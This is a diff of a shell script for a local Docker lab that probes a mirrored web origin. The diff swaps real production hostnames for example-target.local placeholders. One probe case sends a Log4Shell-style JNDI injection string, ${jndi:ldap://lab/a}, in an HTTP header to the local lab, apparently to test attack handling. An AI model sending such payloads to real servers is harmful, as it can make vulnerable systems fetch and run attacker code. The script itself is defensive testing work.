@@ -2,14 +2,14 @@
 set -euo pipefail
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-LAB_DIR="$(cd "$SCRIPT_DIR/../assets/docker-syrup-origin-lab" && pwd)"
+LAB_DIR="$(cd "$SCRIPT_DIR/../assets/docker-sample-origin-lab" && pwd)"
 
 usage() {
   cat <<'EOF'
 Usage:
-  docker_syrup_origin_lab.sh up
-  docker_syrup_origin_lab.sh down
-  docker_syrup_origin_lab.sh probe <output_dir>
+  docker_sample_origin_lab.sh up
+  docker_sample_origin_lab.sh down
+  docker_sample_origin_lab.sh probe <output_dir>
 EOF
 }
 
@@ -29,16 +29,16 @@ case "$cmd" in
     fi
     mkdir -p "$out_dir"
     declare -a cases=(
-      "web_redirect|http://127.0.0.1:19090/notice.do|Host: www.syrup.co.kr"
-      "web_attack_hold|http://127.0.0.1:19090/notice.do|Host: www.syrup.co.kr|X-Test: \${jndi:ldap://lab/a}"
+      "web_redirect|http://127.0.0.1:19090/notice.do|Host: www.example-target.local"
+      "web_attack_hold|http://127.0.0.1:19090/notice.do|Host: www.example-target.local|X-Test: \${jndi:ldap://lab/a}"
       "front400|http://127.0.0.1:19090/__lab/front400|Host: lab-front.invalid"
       "front403|http://127.0.0.1:19090/__lab/front403|Host: lab-front.invalid"
-      "next_auth|http://127.0.0.1:19090/auth/|Host: nxt.syrup.co.kr"
-      "next_fallback|http://127.0.0.1:19090/auth/|Host: wrong-nxt.syrup.co.kr"
-      "next_register|http://127.0.0.1:19090/gold-platform/register-password/|Host: nxt.syrup.co.kr"
-      "appjson_ok|http://127.0.0.1:19270/swapp/sw5/5667|Host: syrup-appif.smartwallet.co.kr"
-      "appjson_fail|http://127.0.0.1:19270/swapp/sw5/5667|Host: syrup-appif.smartwallet.co.kr|Content-Type: text/plain"
-      "static_css|http://127.0.0.1:19090/static/v2/publishing/syrup_intro_2025/css/style_pc.css|Host: static.syrup.co.kr"
+      "next_auth|http://127.0.0.1:19090/auth/|Host: auth.example-target.local"
+      "next_fallback|http://127.0.0.1:19090/auth/|Host: wrong-auth.example-target.local"
+      "next_register|http://127.0.0.1:19090/gold-platform/register-password/|Host: auth.example-target.local"
+      "appjson_ok|http://127.0.0.1:19270/swapp/sw5/5667|Host: api.example-target.local"
+      "appjson_fail|http://127.0.0.1:19270/swapp/sw5/5667|Host: api.example-target.local|Content-Type: text/plain"
+      "static_css|http://127.0.0.1:19090/static/v2/publishing/sample_assets/css/style_pc.css|Host: static.example-target.local"
     )
     for entry in "${cases[@]}"; do
       IFS='|' read -r name url header_a header_b <<<"$entry"
